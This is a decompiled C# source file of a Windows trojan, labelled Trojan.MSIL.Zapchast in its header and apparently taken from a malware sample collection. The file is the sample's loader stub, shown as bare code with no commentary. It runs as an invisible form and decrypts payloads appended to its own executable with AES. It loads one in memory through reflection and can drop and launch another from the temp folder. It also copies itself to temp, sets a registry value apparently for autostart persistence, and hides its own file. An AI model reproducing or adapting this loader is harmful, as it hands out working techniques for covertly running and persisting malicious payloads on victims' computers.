// Decompiled with JetBrains decompiler
// Type: .
// Assembly: ShockService, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 734F9505-CACA-4A59-B5D4-1A5D344BA700
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.Zapchast.f-c4ed3f98e55a24fcbd24b3149b62fe11af1937ebb7bdff7532ea16b26f67a0ed.exe

using \u0001;
using \u0002;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace \u0002
{
  [DesignerGenerated]
  internal sealed class \u0003 : Form
  {
    private IContainer \u0001;
    [AccessedThroughProperty("Button1")]
    private Button \u0002;
    [AccessedThroughProperty("Timer1")]
    private Timer \u0003;
    private byte[] \u0004;
    [NonSerialized]
    internal static \u0004 \u0098;

    public \u0003()
    {
      this.Load += new EventHandler(this.\u0001);
      this.\u0001();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          goto label_2;
label_1:
        if (this.\u0001 != null)
          this.\u0001.Dispose();
label_2:
        if (false)
          goto label_1;
      }
      finally
      {
        if (true)
          base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \u0001()
    {
label_0:
      this.\u0001 = (IContainer) new System.ComponentModel.Container();
label_1:
      if (false)
        goto label_5;
      else
        goto label_9;
label_2:
      if (true)
      {
        this.Timer1 = new Timer(this.\u0001);
        this.SuspendLayout();
        this.Button1.Location = new Point(12, 2);
        this.Button1.Name = \u0003.\u0098(201);
      }
      Button button1 = this.Button1;
      Size size1 = new Size(56, 23);
      Size size2 = size1;
      button1.Size = size2;
      this.Button1.TabIndex = 0;
      this.Button1.Text = \u0003.\u0098(214);
label_5:
      this.Button1.UseVisualStyleBackColor = true;
      if (true)
      {
        this.AutoScaleDimensions = new SizeF(6f, 13f);
        this.AutoScaleMode = AutoScaleMode.Font;
        size1 = new Size(85, 31);
        this.ClientSize = size1;
        this.Controls.Add((Control) this.Button1);
        this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
        if (true)
        {
          this.Name = \u0003.\u0098(223);
          this.Opacity = 0.0;
          this.ShowIcon = false;
          this.ShowInTaskbar = false;
          if (true)
          {
            this.ResumeLayout(false);
            return;
          }
          goto label_2;
        }
        else
          goto label_1;
      }
      else
        goto label_0;
label_9:
      this.Button1 = new Button();
      goto label_2;
    }

    internal virtual Button Button1
    {
      get => this.\u0002;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this.\u0002 = value;
    }

    internal virtual Timer Timer1
    {
      get => this.\u0003;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this.\u0003 = value;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void \u0001(object sender, EventArgs e)
    {
      string[] strArray = Strings.Split(File.ReadAllText(Application.ExecutablePath), \u0003.\u0098(232));
      this.\u0004 = Encoding.Default.GetBytes(Conversions.ToString(\u0003.\u0001(strArray[1], \u0003.\u0098(249))));
      RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Assembly.Load(\u0007.\u0001.Function1).GetType(\u0003.\u0098(262)).GetMethod(\u0003.\u0098(283)).Invoke((object) null, new object[1]
      {
        (object) this.\u0004
      })));
      if (Conversions.ToBoolean(strArray[2]))
      {
        byte[] bytes = Encoding.Default.GetBytes(Conversions.ToString(\u0003.\u0001(strArray[3], \u0003.\u0098(249))));
        File.WriteAllBytes(Path.GetTempPath() + \u0003.\u0098(288) + strArray[4], bytes);
        Process.Start(Path.GetTempPath() + \u0003.\u0098(288) + strArray[4]);
      }
      if (Conversions.ToBoolean(strArray[5]))
      {
        if (!File.Exists(Path.GetTempPath() + \u0003.\u0098(293)))
          File.Copy(Application.ExecutablePath, Path.GetTempPath() + \u0003.\u0098(293));
        Registry.CurrentUser.OpenSubKey(\u0003.\u0098(310), true).SetValue(\u0003.\u0098(371), (object) (Path.GetTempPath() + \u0003.\u0098(293)), RegistryValueKind.String);
      }
      if (Conversions.ToBoolean(strArray[6]))
        File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
      ProjectData.EndApp();
    }

    public static object \u0001(string Decrypt, string Key)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      byte[] numArray1 = new byte[8];
      byte[] numArray2;
      if (true)
        numArray2 = numArray1;
      numArray2[0] = (byte) 1;
      if (true)
        goto label_9;
label_1:
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
      try
      {
        byte[] buffer = Convert.FromBase64String(Decrypt);
        cryptoStream.Write(buffer, 0, buffer.Length);
        if (true)
          cryptoStream.Close();
        Decrypt = Encoding.UTF8.GetString(memoryStream.ToArray());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (object) Decrypt;
label_9:
      numArray2[1] = (byte) 2;
      numArray2[2] = (byte) 3;
      numArray2[3] = (byte) 4;
      numArray2[4] = (byte) 5;
      numArray2[5] = (byte) 6;
      numArray2[6] = (byte) 7;
      numArray2[7] = (byte) 8;
      byte[] salt = numArray2;
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Key, salt);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
      goto label_1;
    }

    static \u0003() => \u0005.\u0001(typeof (\u0003));
  }
}
